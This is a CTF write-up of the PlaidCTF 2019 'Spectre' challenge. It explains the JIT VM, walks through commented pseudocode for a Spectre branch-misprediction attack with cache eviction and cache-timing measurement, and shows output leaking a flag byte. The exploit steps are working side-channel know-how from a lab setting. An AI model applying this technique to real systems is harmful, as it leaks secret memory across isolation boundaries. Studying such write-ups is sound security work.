# PlaidCTF-2019 Spectre writeup

## problem config

Category: Pwnable

Score: 666

Description: 

```
Read the flag. Don't trust anything. 

Download the vm. Workers are running Ubuntu 18.04 on GCE with 1 vCPU and 1 GB of memory.
```



## VM analysis 

* code segment 
  * start address: `0x133700000000`
  * size: `0x400000`
* data segment
  * start address: `0x414100000000`
  * size: `0x2000000`

* VM code
  * quite clear; `encode_*` functions are literally VM code.
  * Our stdin input, that is VM code, will be given to `jit` function.
  * `jit` function generates machine code (x86_64 assembly)



## Outside of VM

* Heap buffer

  * allocated by `calloc(1uLL, 0x1030uLL);`

  * heap struct
```c
    
// just brief view
struct info 
{
    int64 vmcode_len; 		// offset 0
    char vmcode_buf[4096]; 	// offset 8
    (*func_ptr);			// offset 0x1008
    (*func_ptr2);			// offset 0x1010
    int64 ret_rdtsc;		// offset 0x1018
    char flag[16];			// offset 0x1020
}; 
```
* unreachable code

  * `builtin_flush`
  * `encode_time` 

  Those 'unused' code made me confused. I couldn't sure that whether those code are used in exploit. Actually they are just debugging routines, but I didn't know that during the ctf :p

* Instructions generated by `jit` are safe. The only vulnerability is abusing spectre.



## Background 

~~This section is about background knowledge within original [spectre](<https://spectreattack.com/spectre.pdf>) exploit. If you are familiar with spectre, just skip.~~

I will add a new md file about background because it's such a TMI for system newbie.

It is about

* Pipelined CPU
* Branch prediction



## Into the Spectre

This challenge is a quite simple and well made. After we understand how spectre works, what we have to do is clear. Just follow the flow of Spectre!



### Brief flow

`builtin_bc` has the only branch instruction other than our `loop` VM code. It is definitely for spectre because it does read byte from memory. If we have OOB read, we can read the flag. Unfortunately, the binary is safe from the OOB.

```assembly
.text:0000000000000C4A                 public builtin_bc
.text:0000000000000C4A builtin_bc      proc near               ; DATA XREF: main+16F↑o
.text:0000000000000C4A ; __unwind {
.text:0000000000000C4A                 mov     rdx, cs:the_vm
.text:0000000000000C51                 or      rax, 0FFFFFFFFFFFFFFFFh
.text:0000000000000C55                 cmp     [rdx], rdi
.text:0000000000000C58                 jbe     short locret_C5F
.text:0000000000000C5A                 movzx   eax, byte ptr [rdx+rdi+8]
.text:0000000000000C5F
.text:0000000000000C5F locret_C5F:                             ; CODE XREF: builtin_bc+E↑j
.text:0000000000000C5F                 retn
.text:0000000000000C5F ; } // starts at C4A
```

Then we can think of steps below.

	1. make `[rdx]` take long time by cache eviction (cuz we cannot use the flush instruction).
 	2. get `eax = [rdx+rdi+8]` and access somewhere using `eax`

3. Do cache timing attack!

### Things to be considered

* Cache eviction
  * We should sure that page of  `the_vm` (referenced as `[rdx]`) is out of cache.
* Branch prediction
  * In the pipeline, fetched instruction followed by `jbe` is sure to be `movzx   eax, byte ptr [rdx+rdi+8]`



### Exploit abstract and comments

```c

// static value
int flush_size = 64;


// make our test area have dirty bit				--- A
void * temp = 0x0;
for (int j = 0; j < 0x100000/flush_size; j++)
	data[temp + j] = 0xffffffff;

// branch history (pAp) poisoning 					--- B
builtin_bc (0x1000 - 4); // jbe instruction will not jump
// repeat 50 times

// flush by reverse order							--- C
for (int i = 0; i < 0x100; i++) 					
{
  void * temp = 0x2000000;
  for (int j = 0; j < 0x1f00000 / flush_size; j++)
    r8 = data[temp - j];
}

// branch history (global) poisoning				--- D
for (int i = 0; i < -1 ; i++); /* jle instruction will not jump */
// repeat 256 times

builtin_time (); // access flag into cache			--- E

// go to branch speculation							--- F
/* use (idx * 0x1000) as array index; */
r15 = 56, r12 = 56-offset;			
r8 = data[(builtin_bc(0x1018) << r15) >> r12];

// cache timing attack 								--- G
int idx = 0;						
for (int i = 0; i < 0x100; i ++)
{
    long temp;
    temp = time ();
    r8 = ((long*)data)[idx];
    temp = time () - temp;
    
    ((long*)data)[i] &= temp;
}


```

* test area: the place where indexed with `(return value of builtin_bc) * PAGE_SIZE`
* A: making test area dirty
  * Honestly, I don't know the reason why making dirty bits makes exploit work, while accessing test area via `load` instruction is fail to trigger spectre.
  * Here are my hypotheses
    * We need to ensure that our test area is in L2 cache.
    * Not L1 because we need cache timing attack.
    * Not L3 because it takes too long to access during branch speculation.
    * After accessing test area via `load`, however, it remains in L1 cache. We can figure out this by timing attack.
    * But accessing via `store` works!
    * There is a cache replacement policy that the block having dirty bit is evicted first.
* B: poisoning branch history of per address
* C: flushing cache. Done by reverse order to prevent stride prediction
* D: poisoning global branch history
* E: let the flag be in L1 cache
  * `*(unsigned __int8 *)(the_vm + 0x1020)`

* F: trigger branch speculation that reading one byte of flag.
  * When exploit isn't working, I thought the cause of failure was too long epilogue of builtin routine and then we need to make other routine as short as possible.
  * So, calculating index by shift operation would be the fastest, I guessed.
* G: simple cache timing attack.

* Well, some parts of exploit are not necessary (B, D, E). But I wanna memorize all my approaches, which makes exploit longer. 

## Exploit 

[sol.py](<https://github.com/bincat99/pwn/blob/master/plaid-2019/spectre/sol.py>)



```bash
➜  spectre python sol.py
[+] Starting local process './spectre': pid 27308
[*] '/home/bincat/pwn/plaid-2019/spectre/spectre'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
rlength: 0xec4
length: 0x1000
0x0 774 
0x1 345 0x2 614 0x3 217 0x4 391 0x5 257 0x6 432 0x7 223 0x8 380 0x9 226 0xa 277 0xb 232 0xc 383 0xd 240 0xe 383 0xf 237 0x10 571 
0x11 203 0x12 243 0x13 211 0x14 389 0x15 237 0x16 380 0x17 228 0x18 386 0x19 209 0x1a 383 0x1b 220 0x1c 266 0x1d 225 0x1e 523 0x1f 323 0x20 600 
0x21 763 0x22 431 0x23 208 0x24 226 0x25 223 0x26 548 0x27 334 0x28 423 0x29 220 0x2a 214 0x2b 225 0x2c 220 0x2d 208 0x2e 429 0x2f 226 0x30 457 
0x31 231 0x32 426 0x33 226 0x34 391 0x35 220 0x36 257 0x37 240 0x38 617 0x39 214 0x3a 252 0x3b 226 0x3c 220 0x3d 220 0x3e 440 0x3f 231 0x40 386 
0x41 346 0x42 263 0x43 220 0x44 217 0x45 223 0x46 432 0x47 206 0x48 228 0x49 226 0x4a 226 0x4b 205 0x4c 380 0x4d 205 0x4e 577 0x4f 228 0x50 77 
0x51 297 0x52 385 0x53 226 0x54 432 0x55 232 0x56 380 0x57 231 0x58 263 0x59 760 0x5a 431 0x5b 225 0x5c 220 0x5d 225 0x5e 223 0x5f 231 0x60 508 
0x61 220 0x62 226 0x63 228 0x64 220 0x65 231 0x66 383 0x67 223 0x68 380 0x69 226 0x6a 429 0x6b 220 0x6c 434 0x6d 223 0x6e 511 0x6f 325 0x70 263 
0x71 228 0x72 386 0x73 229 0x74 343 0x75 334 0x76 428 0x77 208 0x78 389 0x79 214 0x7a 223 0x7b 220 0x7c 260 0x7d 228 0x7e 537 0x7f 337 0x80 432 
0x81 220 0x82 223 0x83 220 0x84 937 0x85 228 0x86 223 0x87 223 0x88 271 0x89 220 0x8a 225 0x8b 209 0x8c 637 0x8d 323 0x8e 389 0x8f 225 0x90 437 
0x91 223 0x92 223 0x93 217 0x94 429 0x95 223 0x96 386 0x97 220 0x98 251 0x99 228 0x9a 437 0x9b 220 0x9c 377 0x9d 220 0x9e 386 0x9f 226 0xa0 217 
0xa1 229 0xa2 343 0xa3 354 0xa4 383 0xa5 200 0xa6 220 0xa7 226 0xa8 392 0xa9 226 0xaa 543 0xab 317 0xac 394 0xad 225 0xae 223 0xaf 209 0xb0 903 
0xb1 223 0xb2 386 0xb3 200 0xb4 426 0xb5 226 0xb6 226 0xb7 231 0xb8 440 0xb9 209 0xba 429 0xbb 228 0xbc 283 0xbd 223 0xbe 226 0xbf 223 0xc0 209 
0xc1 231 0xc2 225 0xc3 217 0xc4 217 0xc5 206 0xc6 440 0xc7 220 0xc8 394 0xc9 223 0xca 394 0xcb 223 0xcc 432 0xcd 209 0xce 383 0xcf 223 0xd0 400 
0xd1 223 0xd2 806 0xd3 223 0xd4 291 0xd5 217 0xd6 214 0xd7 234 0xd8 235 0xd9 226 0xda 380 0xdb 209 0xdc 243 0xdd 228 0xde 220 0xdf 220 0xe0 429 
0xe1 223 0xe2 428 0xe3 223 0xe4 223 0xe5 220 0xe6 343 0xe7 340 0xe8 234 0xe9 223 0xea 226 0xeb 225 0xec 380 0xed 229 0xee 228 0xef 223 0xf0 237 
0xf1 226 0xf2 223 0xf3 220 0xf4 265 0xf5 220 0xf6 428 0xf7 229 0xf8 1000 0xf9 320 0xfa 506 0xfb 328 0xfc 397 0xfd 211 0xfe 317 0xff 66[*] Process './spectre' stopped with exit code 0 (pid 27308)


➜  spectre python upload_server.py 
➜  spectre python upload_server.py
idx : 0x70 :  0x31
p
➜  spectre 

```

My exploit leaks the flag one by one and is not the 100% reliable.

On local execution, you would notice `0x50 77 ` , which means 'P' is the first byte of flag.

Also upload_server.py tell us 'p' is the first byte of flag. (you need `hash` file that saves the result of `hashcash -m -b 28 -r spectre`)



## Conclusion

* Blind environment?

  The challenge was a simple(after solved), but such a blind environment makes harder the challenge. When our exploit is not working, we only could guess the cause. It is kind a blind puzzle. We cannot know how D-cache is filled. 

* Awesome quality

  The author must be super duper GOSU. Thanks to the author and PPP!